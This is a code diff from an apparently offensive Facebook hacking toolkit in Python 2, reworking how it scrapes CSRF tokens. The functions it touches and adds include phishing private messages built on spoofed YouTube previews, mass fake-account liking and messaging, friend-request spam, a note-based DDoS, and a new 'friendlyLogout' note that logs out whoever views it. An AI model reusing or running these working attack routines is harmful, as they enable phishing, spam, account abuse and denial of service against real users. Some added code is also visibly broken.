@@ -107,6 +107,7 @@ def set_dtsg():
     flag = False
     try:
         response = br.open('https://www.facebook.com/')
+        ''' Old dtsg set module.. 
         for form in br.forms():
             for control in form.controls: 
                 if control.name == 'fb_dtsg':
@@ -114,11 +115,13 @@ def set_dtsg():
                     break
             n += 1
             if flag: break
-        br.select_form(nr=n-1)
+        br.select_form(nr=n-1) '''
         
         if globalLogging:
             logs(response.read())
-            
+
+    
+        
     except mechanize.HTTPError as e:
         logs(e.code)
         print e.code
@@ -127,10 +130,23 @@ def set_dtsg():
         print e.reason.args    
     except:
         logs('Error in the dtsg set module')
-        print '\rError in the dtsg set module\r'
-        raise 
+        print '\rTrying to set dtsg \r'
+    
+    return workarounddtsg()
 
-            
+def workarounddtsg():
+    try:
+        response = br.open('https://www.facebook.com/')
+        parse = response.read()
+        match = re.search("\"fb_dtsg\"", parse)
+        matchBis = re.search("value=\"",parse[match.end():])
+        matchBisBis = re.search("\"",parse[match.end()+matchBis.end():])
+        fb_dtsg = parse[match.end()+matchBis.end():match.end()+matchBis.end()+matchBisBis.start()]
+        return fb_dtsg
+    except:
+        print 'error'
+        return 0
+    
 def getC_user():
     # Get the c_user value from the cookie
     #Filtramos la cookie para obtener el nombre de usuario
@@ -141,7 +157,9 @@ def getC_user():
         
 def createUser(number):
     
-    set_dtsg()
+    fb_dtsg = set_dtsg()
+    if (fb_dtsg == 0):
+        print 'ERROR MOTHER FUCKER -_-'
     c_user = getC_user()
     
     arguments = {
@@ -149,7 +167,7 @@ def createUser(number):
         '__a' : '1',
         '__dyn' : '798aD5z5zufEa0',
         '__req' : '4',
-        'fb_dtsg' : br.form['fb_dtsg'],
+        'fb_dtsg' : fb_dtsg,
         'phstamp' : '16581655751108754574',
     }
     
@@ -184,7 +202,8 @@ def createUser(number):
     fullFlag = MyParser.parseData(userRaw)
     
     return fullFlag
-    
+
+'''    
 def deleteUser():
     #Number is the max amount of test user accounts - Modify this value if the platform change
     number = 10 
@@ -247,7 +266,36 @@ def deleteUser():
     except:
         logs('No users for eliminate')
         print '\rNo users for eliminate\r'
+'''
+
+def deleteUser(appId):
+    ''' Selects the fb_dtsg form '''   
+    fb_dtsg = set_dtsg()
+    if (fb_dtsg == 0):
+        print 'ERROR MOTHER FUCKER -_-'
+    arguments = {
+        '__user' : str(getC_user()),
+        '__a' : '1',
+        '__dyn' : '7w86i3S2e4oK4pomXWo5O12wYw',
+        '__req' : '4',
+        'fb_dtsg' : fb_dtsg,
+        'ttstamp' : '26581718683108776783808786',
+        '__rev' : '1409158'
+        }
+    testUserID =  database.getUsers()
+    for n in len(testUserID[0]):
+        arguments['test_user_ids['+str(n)+']'] = str(testUserID[0][n])      
+    
+    datos = urlencode(arguments)
+    try:
+        response = br.open('https://developers.facebook.com/apps/async/test-users/delete/?app_id='+appId,datos)
         
+        if globalLogging:
+            logs(response.read())
+
+    except:
+        logs('Error deleting users')
+        print 'Error deleting users \n'
 
 def massLogin():
     
@@ -287,7 +335,9 @@ def friendshipRequest():
 def sendRequest(userID,c_user):
     
     ''' Selects the fb_dtsg form '''   
-    set_dtsg()
+    fb_dtsg = set_dtsg()
+    if (fb_dtsg == 0):
+        print 'ERROR MOTHER FUCKER -_-'
     arguments = {
         'to_friend' : userID,
         'action' : 'add_friend',
@@ -304,7 +354,7 @@ def sendRequest(userID,c_user):
         '__a' : '1',
         '__dyn' : '7n8aD5z5zu',
         '__req' : 'n',
-        'fb_dtsg' : br.form['fb_dtsg'],
+        'fb_dtsg' : fb_dtsg,
         'phstamp' : '1658165688376111103320'
         }
         
@@ -369,7 +419,9 @@ def sendRequestToList(victim):
                 
                 count += 1
                 ''' Selects the fb_dtsg form '''   
-                set_dtsg()
+                fb_dtsg = set_dtsg()
+                if (fb_dtsg == 0):
+                    print 'ERROR MOTHER FUCKER -_-'
                 c_user = getC_user()
                     
                 arguments = {
@@ -388,7 +440,7 @@ def sendRequestToList(victim):
                     '__a' : '1',
                     '__dyn' : '7n8aD5z5zu',
                     '__req' : 'n',
-                    'fb_dtsg' : br.form['fb_dtsg'],
+                    'fb_dtsg' : fb_dtsg,
                     'ttstamp' : '265817211599516953787450107',
                     }
                 
@@ -423,7 +475,9 @@ def acceptRequest():
     acceptIDS = MyParser.parsePending()
     while len(acceptIDS) != 0:
         for elements in acceptIDS:
-            set_dtsg()               
+            fb_dtsg = set_dtsg()
+            if (fb_dtsg == 0):
+                print 'ERROR MOTHER FUCKER -_-'               
             arguments = {
                 'action' : 'confirm',
                 'id' : elements,
@@ -432,7 +486,7 @@ def acceptRequest():
                 '__a' : '1',
                 '__dyn' : '7n8aD5z5zu',
                 '__req' : 'm',
-                'fb_dtsg' : br.form['fb_dtsg'],
+                'fb_dtsg' : fb_dtsg,
                 'phstamp' : '165816867997811675120'
                 }
     
@@ -524,7 +578,9 @@ def like(postId, quantity):
                         cj._cookies = cookieArray[i]
                         c_user = getC_user()
                         try:
-                            set_dtsg()
+                            fb_dtsg = set_dtsg()
+                            if (fb_dtsg == 0):
+                                print 'ERROR MOTHER FUCKER -_-'
                             arguments = {
                                 'like_action' : 'true',
                                 'ft_ent_identifier' : str(postId[post]),
@@ -539,7 +595,7 @@ def like(postId, quantity):
                                 '__a' : '1',
                                 '__dyn' : '7n8ahyj35ym3KiA',
                                 '__req' : 'c',
-                                'fb_dtsg' : br.form['fb_dtsg'],
+                                'fb_dtsg' : fb_dtsg,
                                 'phstamp' : '165816595797611370260',
                             }
                     
@@ -579,7 +635,10 @@ def appMessageSpoof(appId,link,picture,title,domain,description,comment):
     c_user = getC_user()
     print str(c_user)+'\n'
     try:
-        set_dtsg()
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
+            
         arguments = {
             'fb_dtsg' : br.form['fb_dtsg'],
             'preview' : '0',
@@ -613,9 +672,12 @@ def linkPreviewYoutube(link,videoLink,title,summary,comment,videoID, privacy):
     c_user = getC_user()
     print str(c_user)+'\n'
     try:
-        set_dtsg()
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
+            
         arguments = {
-            'fb_dtsg' : br.form['fb_dtsg'],
+            'fb_dtsg' : fb_dtsg,
             'composer_session_id' : '38c20e73-acfc-411a-8313-47c095b01e42',
             'xhpc_context' : 'profile',
             'xhpc_ismeta' : '1',
@@ -715,10 +777,13 @@ def linkPreview(link,realLink,title,summary,comment,image,privacy):
     c_user = getC_user()
     print str(c_user)+'\n'
     try:
-        set_dtsg()
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
+            
         arguments = {
             'composer_session_id' : '787d2fec-b5c1-41fe-bbda-3450a03240c6',
-            'fb_dtsg' : br.form['fb_dtsg'],
+            'fb_dtsg' : fb_dtsg,
             'xhpc_context' : 'profile',
             'xhpc_ismeta' : '1',
             'xhpc_timeline' : '1',
@@ -812,10 +877,13 @@ def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo,privacy):
     c_user = getC_user()
     print str(c_user)+'\n'
     try:
-        set_dtsg()
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
+            
         arguments = {
             'composer_session_id' : '8c4e1fa6-5f1f-4c16-b393-5c1ab4c3802b',
-            'fb_dtsg' : br.form['fb_dtsg'],
+            'fb_dtsg' : fb_dtsg,
             'xhpc_context' : 'profile',
             'xhpc_ismeta' : '1',
             'xhpc_timeline' : '1',
@@ -972,7 +1040,10 @@ def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,e
     c_user = getC_user()
     
     try:
-        set_dtsg()
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
+            
         arguments = {
             'message_batch[0][action_type]' : 'ma-type:user-generated-message',
             'message_batch[0][thread_id]' : '',
@@ -1041,7 +1112,7 @@ def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,e
             '__a' : '1',
             '__dyn' : '7n8a9EAMBlCFYwyt2u6aOGeExEW9J6yUgByVbGAF4iGGeqheCu6po',
             '__req' : '1n',
-            'fb_dtsg' : br.form['fb_dtsg'],
+            'fb_dtsg' : fb_dtsg,
             'ttstamp' : '26581658074898653',
             '__rev' : '1161243'
             }
@@ -1063,14 +1134,17 @@ def privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,sum
     c_user = getC_user()
     print str(c_user)+'\n'
     try:
-        set_dtsg()
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
+            
         arguments = {
             'message_batch[0][action_type]' : 'ma-type:user-generated-message',
             'message_batch[0][thread_id]' : '',
-            'message_batch[0][author]' : 'fbid:766864933',
+            'message_batch[0][author]' : 'fbid:'+str(c_user),
             'message_batch[0][author_email]' : '',
             'message_batch[0][coordinates]' : '',
-            'message_batch[0][timestamp]' : '1372684598010',
+            'message_batch[0][timestamp]' : '1410457740680',
             'message_batch[0][timestamp_absolute]' : 'Today',
             'message_batch[0][timestamp_relative]' : '10:16am',
             'message_batch[0][timestamp_time_passed]' : '0',
@@ -1090,6 +1164,7 @@ def privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,sum
             'message_batch[0][content_attachment][attachment][params][urlInfo][canonical]' : str(videoLink),
             'message_batch[0][content_attachment][attachment][params][urlInfo][final]' : str(videoLink),
             'message_batch[0][content_attachment][attachment][params][urlInfo][user]' : str(evilLink),
+            'message_batch[0][content_attachment][attachment][params][urlInfo][log][1408344793]' : 'https://www.mkit.com.ar/',
             'message_batch[0][content_attachment][attachment][params][favicon]' : 'http://s.ytimg.com/yts/img/favicon_32-vflWoMFGx.png',
             'message_batch[0][content_attachment][attachment][params][title]' : str(title),
             'message_batch[0][content_attachment][attachment][params][summary]' : str(summary),
@@ -1100,13 +1175,13 @@ def privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,sum
             'message_batch[0][content_attachment][attachment][params][video][0][src]' : 'http://www.youtube.com/v/'+str(hijackedVideo)+'?version=3&autohide=1&autoplay=1',
             'message_batch[0][content_attachment][attachment][params][video][0][width]' : '1280',
             'message_batch[0][content_attachment][attachment][params][video][0][height]' : '720',
-            'message_batch[0][content_attachment][attachment][params][video][0][safe]' : '1',
+            'message_batch[0][content_attachment][attachment][params][video][0][secure_url]' : 'https://www.youtube.com/v/'+str(hijackedVideo)+'?version=3&autohide=1&autoplay=1',
             'message_batch[0][content_attachment][attachment][type]' : '100',
             'message_batch[0][content_attachment][link_metrics][source]' : 'ShareStageExternal',
             'message_batch[0][content_attachment][link_metrics][domain]' : 'www.youtube.com',
             'message_batch[0][content_attachment][link_metrics][base_domain]' : 'youtube.com',
-            'message_batch[0][content_attachment][link_metrics][title_len]' : '59',
-            'message_batch[0][content_attachment][link_metrics][summary_len]' : '160',
+            'message_batch[0][content_attachment][link_metrics][title_len]' : str(len(title)),
+            'message_batch[0][content_attachment][link_metrics][summary_len]' : str(len(summary)),
             'message_batch[0][content_attachment][link_metrics][min_dimensions][0]' : '70',
             'message_batch[0][content_attachment][link_metrics][min_dimensions][1]' : '70',
             'message_batch[0][content_attachment][link_metrics][images_with_dimensions]' : '1',
@@ -1128,19 +1203,18 @@ def privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,sum
             'message_batch[0][content_attachment][composer_metrics][timed_out]' : '0',
             'message_batch[0][content_attachment][composer_metrics][sort_order]' : '',
             'message_batch[0][content_attachment][composer_metrics][selector_type]' : 'UIThumbPager_6',
-            'message_batch[0][forward_count]' : '0',
             'message_batch[0][force_sms]' : 'true',
             'message_batch[0][ui_push_phase]' : 'V3',
             'message_batch[0][status]' : '0',
-            'message_batch[0][message_id]' : '<1372684598010:2832510292-4024988604@mail.projektitan.com>',
+            'message_batch[0][message_id]' : '<1410457740680:1367750931-713286099@mail.projektitan.com>',
             'message_batch[0][client_thread_id]' : 'user:'+str(victimId),
             'client' : 'web_messenger',
             '__user' : str(c_user),
             '__a' : '1',
             '__dyn' : '7n8ahyj35CCOadgDxqjdLg',
             '__req' : 'c',
-            'fb_dtsg' : br.form['fb_dtsg'],
-            'phstamp' : '16581677611695491025269'
+            'fb_dtsg' : fb_dtsg,
+            'ttstamp' : '265816977807275100848411568',
             }
         
         datos = urlencode(arguments)
@@ -2137,7 +2211,11 @@ def simpleDotGraph(friends, victim):
     myGraph.close()
     
 def noteDDoS(imageURL,noteID, privacy):
-    set_dtsg()   
+    
+    fb_dtsg = set_dtsg()
+    if (fb_dtsg == 0):
+        print 'ERROR MOTHER FUCKER -_-'
+           
     j = int(raw_input('starting parameter number? (img.jpg?file=number) : '))
     amount = int(raw_input('last parameter number? (img.jpg?file=number) : '))
     title = raw_input('Note title: ')
@@ -2146,7 +2224,7 @@ def noteDDoS(imageURL,noteID, privacy):
         content += '<p><img src="'+imageURL+'?file='+str(i)+'"></img></p>'
         
     arguments = {
-        'fb_dtsg' : br.form['fb_dtsg'],
+        'fb_dtsg' : fb_dtsg,
         'object_id' : noteID,
         'note_id' : noteID,
         'id' : getC_user(),
@@ -2178,11 +2256,13 @@ def noteDDoS(imageURL,noteID, privacy):
     
 def devTest(appID):
     try:
-        set_dtsg()
-        dtsg = br.form['fb_dtsg']
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
+            
         br.open('https://developers.facebook.com/').read()
         arguments = {   
-            'fb_dtsg' : dtsg,
+            'fb_dtsg' : fb_dtsg,
             'count' : '4',
             'app_id' : str(appID),
             'install_app' : '1',
@@ -2284,15 +2364,17 @@ def getTest(appID):
         flag = 0
         while flag != -1:
             
-            set_dtsg()
-            dtsg = br.form['fb_dtsg']
+            fb_dtsg = set_dtsg()
+            if (fb_dtsg == 0):
+                print 'ERROR MOTHER FUCKER -_-'
+                
             arguments = {   
                 'start' : str(start),
                 '__user' : getC_user(),
                 '__a' : '1',
                 '__dyn' : '7w86i1PyUnxqnFwn8',
                 '__req' : '4',
-                'fb_dtsg' : dtsg,
+                'fb_dtsg' : fb_dtsg,
                 'ttstamp' : '26581707111311350113871144898',
                 '__rev' : '1262242'
             }
@@ -2314,10 +2396,12 @@ def changePassword(appID):
     for persona in people:
         if persona in peopleLogged:
             try:
-                set_dtsg()
-                dtsg = br.form['fb_dtsg']
+                fb_dtsg = set_dtsg()
+                if (fb_dtsg == 0):
+                    print 'ERROR MOTHER FUCKER -_-'
+                    
                 arguments = { 
-                    'fb_dtsg' : dtsg,  
+                    'fb_dtsg' : fb_dtsg,  
                     'name' : str(persona[1]),
                     'password' : '1234567890',
                     'confirm_password' : '1234567890',
@@ -2368,7 +2452,9 @@ def likeDev(postId):
                 cj._cookies = cookieArray[i]
                 c_user = getC_user()
                 try:
-                    set_dtsg()
+                    fb_dtsg = set_dtsg()
+                    if (fb_dtsg == 0):
+                        print 'ERROR MOTHER FUCKER -_-'
                     
                     arguments = {
                         'like_action' : 'true',
@@ -2384,7 +2470,7 @@ def likeDev(postId):
                         '__a' : '1',
                         '__dyn' : '7n8ahyj35ym3KiA',
                         '__req' : 'c',
-                        'fb_dtsg' : br.form['fb_dtsg'],
+                        'fb_dtsg' : fb_dtsg,
                         'phstamp' : '165816595797611370260',
                     }
                     
@@ -2426,59 +2512,63 @@ def massMessage(page,message):
         print 'First you must create accounts: option 1) '
         return
     
+    pageID = getUserID(page)
+    
     for i in range(len(cookieArray)):
         try:
             cj._cookies = cookieArray[i]
             c_user = getC_user()
             print str(c_user)+'\n'
-            pageID = getUserID(page)
+            
             numero = ''
             numero2 = ''
             for i in range(10):
                 numero += str(random.randrange(0,10))
             for i in range(10):
                 numero2 += str(random.randrange(0,10))
-                set_dtsg()
-                dtsg = br.form['fb_dtsg']
-                arguments = {
-                    'message_batch[0][action_type]' : 'ma-type:user-generated-message',
-                    'message_batch[0][author]' : 'fbid:'+c_user,
-                    'message_batch[0][timestamp]' : '1401416840784',
-                    'message_batch[0][timestamp_absolute]' : 'Today',
-                    'message_batch[0][timestamp_relative]' : '11:27pm',
-                    'message_batch[0][timestamp_time_passed]' : '0',
-                    'message_batch[0][is_unread]' : 'false',
-                    'message_batch[0][is_cleared]' : 'false',
-                    'message_batch[0][is_forward]' : 'false',
-                    'message_batch[0][is_filtered_content]' : 'false',
-                    'message_batch[0][is_spoof_warning]' : 'false',
-                    'message_batch[0][source]' : 'source:titan:web',
-                    'message_batch[0][body]' : message,
-                    'message_batch[0][has_attachment]' : 'false',
-                    'message_batch[0][html_body]' : 'false',
-                    'message_batch[0][specific_to_list][0]' : 'fbid:'+pageID,
-                    'message_batch[0][specific_to_list][1]' : 'fbid:'+c_user,
-                    'message_batch[0][force_sms]' : 'true',
-                    'message_batch[0][ui_push_phase]' : 'V3',
-                    'message_batch[0][status]' : '0',
-                    'message_batch[0][message_id]' : '<1401416840784:'+numero+'-'+numero2+'@mail.projektitan.com>',
-                    '''<1401416840784:554304545-874733751@mail.projektitan.com>','''
-                    'message_batch[0][client_thread_id]' : 'user:'+pageID,
-                    'client' : 'mercury',
-                    '__user' : c_user,
-                    '__a' : '1',
-                    '__dyn' : '7n8ajEAMCBynUKt2u6aOGeExEW9ACxO4pbGA8AGGBy6C-Cu6popDFp4qu',
-                    '__req' : 'q',
-                    'fb_dtsg' : dtsg,
-                    'ttstamp' : '26581697273111715585898748',
-                    '__rev' : '1268876'
-                    }
                 
-                datos = urlencode(arguments)
-                response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php',datos)
-        
-                if globalLogging:
-                        logs(response.read())
+            fb_dtsg = set_dtsg()
+            if (fb_dtsg == 0):
+                print 'ERROR MOTHER FUCKER -_-'
+            arguments = {
+                'message_batch[0][action_type]' : 'ma-type:user-generated-message',
+                'message_batch[0][author]' : 'fbid:'+c_user,
+                'message_batch[0][timestamp]' : '1401416840784',
+                'message_batch[0][timestamp_absolute]' : 'Today',
+                'message_batch[0][timestamp_relative]' : '11:27pm',
+                'message_batch[0][timestamp_time_passed]' : '0',
+                'message_batch[0][is_unread]' : 'false',
+                'message_batch[0][is_cleared]' : 'false',
+                'message_batch[0][is_forward]' : 'false',
+                'message_batch[0][is_filtered_content]' : 'false',
+                'message_batch[0][is_spoof_warning]' : 'false',
+                'message_batch[0][source]' : 'source:titan:web',
+                'message_batch[0][body]' : message,
+                'message_batch[0][has_attachment]' : 'false',
+                'message_batch[0][html_body]' : 'false',
+                'message_batch[0][specific_to_list][0]' : 'fbid:'+pageID,
+                'message_batch[0][specific_to_list][1]' : 'fbid:'+c_user,
+                'message_batch[0][force_sms]' : 'true',
+                'message_batch[0][ui_push_phase]' : 'V3',
+                'message_batch[0][status]' : '0',
+                'message_batch[0][message_id]' : '<1401416840784:'+numero+'-'+numero2+'@mail.projektitan.com>',
+                '''<1401416840784:554304545-874733751@mail.projektitan.com>','''
+                'message_batch[0][client_thread_id]' : 'user:'+pageID,
+                'client' : 'mercury',
+                '__user' : c_user,
+                '__a' : '1',
+                '__dyn' : '7n8ajEAMCBynUKt2u6aOGeExEW9ACxO4pbGA8AGGBy6C-Cu6popDFp4qu',
+                '__req' : 'q',
+                'fb_dtsg' : fb_dtsg,
+                'ttstamp' : '26581697273111715585898748',
+                '__rev' : '1268876'
+                }
+            
+            datos = urlencode(arguments)
+            response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php',datos)
+    
+            if globalLogging:
+                    logs(response.read())
         
         except mechanize.HTTPError as e:
             print e.code
@@ -2492,8 +2582,10 @@ def massMessage(page,message):
 
 def logTestUser(testUser):
     try:
-        set_dtsg()
-        dtsg = br.form['fb_dtsg']
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
+        
         c_user = getC_user()
         arguments = {
             'user_id' : testUser,
@@ -2503,7 +2595,7 @@ def logTestUser(testUser):
             '__req' : '2',
             'ttstamp' : '2658172826512290796710073107',
             '__rev' : '1270592',
-            'fb_dtsg' : dtsg,
+            'fb_dtsg' : fb_dtsg,
             }
         datos = urlencode(arguments)
         response = br.open('https://developers.facebook.com/checkpoint/async/test-user-login/dialog/',datos)
@@ -2516,9 +2608,11 @@ def logTestUser(testUser):
             matchBisBis = re.search('"',line[match.end()+matchBis.end():])
             code = line[match.end()+matchBis.end():match.end()+matchBis.end()+matchBisBis.start()]
 
-        set_dtsg()
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
 
-        arguments['fb_dtsg'] = br.form['fb_dtsg']
+        arguments['fb_dtsg'] = fb_dtsg
         arguments['n'] = str(code)
         
         datos = urlencode(arguments)
@@ -2718,3 +2812,112 @@ def simpleDotGraphDatabase(friends, victim):
             
             database.addNode(victim,mutualFriend, mutualFriendID)
             database.addEdge(victim,transitive, transitiveID, mutualFriend, mutualFriendID)
+            
+            
+
+    
+def friendlyLogout(noteID,privacy):
+    
+    fb_dtsg = set_dtsg()
+    if (fb_dtsg == 0):
+        print 'ERROR MOTHER FUCKER -_-'
+        return 
+    
+    existence = raw_input("Share an existent infected note? 1|0: ")
+    
+
+
+    title = raw_input('Note title: ')
+    content = ''
+    for i in range(0,10):
+        content += '<p><img src="http://www.facebook.com/n/?home.php&clk_loc=5&mid=72b01a8G5af400143243G0Gd4&bcode=1.1354826874.AbllucLcWqHQbSNM&n_m=hackedby@chinoogawa-'+str(i)+'"/></p>'
+       
+    arguments = {
+        'fb_dtsg' : fb_dtsg,
+        'object_id' : noteID,
+        'note_id' : noteID,
+        'id' : getC_user(),
+        'title' : title,
+        'note_content' : content,
+        'audience['+noteID+'][value]' : privacy,
+        'publish' : 'Publish',
+        '__user' : getC_user(),
+        '__a' : '1',
+        '__dyn' : '7n8ahyj34fzpQ9UoHaEWy1m9ACwKyaF3pqzCAjFDxCm6qyE',
+        '__req' : '7',
+        'ttstamp' : '2658169897154120115496511690',
+        '__rev' : '1224624'
+        }
+    
+    datos = urlencode(arguments)
+    try:
+        response = br.open('https://www.facebook.com/ajax/notes/edit',datos)
+    except mechanize.HTTPError as e:
+        logs(e.code)
+        print e.code
+    except mechanize.URLError as e:
+        logs(e.reason.args)
+        print e.reason.args    
+    except:
+        logs('Error in the friendlyLogout module')
+        print '\rError in the friendlyLogout module\r'
+        raise
+    
+    arguments = {
+        'fb_dtsg' : fb_dtsg,
+        'app_id' : '2347471856',
+        'redirect_uri' : 'https://www.facebook.com/',
+        'display' : 'popup',
+        'access_token' : '',
+        'sdk' : '',
+        'from_post' : '1',
+        'e2e' : '{"submit_0":1409803100561}',
+        'xhpc_context' : 'home',
+        'xhpc_ismeta' : '1',
+        'xhpc_timeline' : '',
+        'xhpc_targetid' : getC_user(),
+        'xhpc_publish_type' : '1',
+        'xhpc_message_text' : '#FBHT rocks! https://github.com/chinoogawa/fbht/',
+        'xhpc_message' : '#FBHT rocks! https://github.com/chinoogawa/fbht/',
+        'is_explicit_place' : '',
+        'composertags_place' : '',
+        'composertags_place_name' : '',
+        'tagger_session_id' : '1409803081',
+        'action_type_id[0]' : '',
+        'object_str[0]' : '',
+        'object_id[0]' : '',
+        'og_location_id[0]' : '',
+        'hide_object_attachment' : '0',
+        'og_suggestion_mechanism' : '',
+        'og_suggestion_logging_data' : '',
+        'icon_id' : '',
+        'share_action_properties' : '{"object":"https:\/\/www.facebook.com\/notes\/'+getName(getC_user())+'\/'+noteID+'\/'+noteID+'"}',
+        'share_action_type_id' : '400681216654175',
+        'composertags_city' : '',
+        'disable_location_sharing' : 'false',
+        'composer_predicted_city' : '',
+        'audience[0][row_updated_time]' : '1409803103',
+        'audience[0][custom_value]' : privacy,
+        'audience[0][value]' : '111',
+        '__CONFIRM__' : '1',
+        '__user' : getC_user(),
+        '__a' : '1',
+        '__dyn' : '7xu5V84Oi3S2e4oK4pomXWomwho4a',
+        '__req' : '7',
+        'ttstamp' : '26581715110910598979511876122',
+        '__rev' : '1398396'
+        }
+
+    datos = urlencode(arguments)
+    try:
+        response = br.open('https://www.facebook.com/v1.0/dialog/share/submit',datos)
+    except mechanize.HTTPError as e:
+        logs(e.code)
+        print e.code
+    except mechanize.URLError as e:
+        logs(e.reason.args)
+        print e.reason.args    
+    except:
+        logs('Error in the friendlyLogout module')
+        print '\rError in the friendlyLogout module\r'
+        raise    
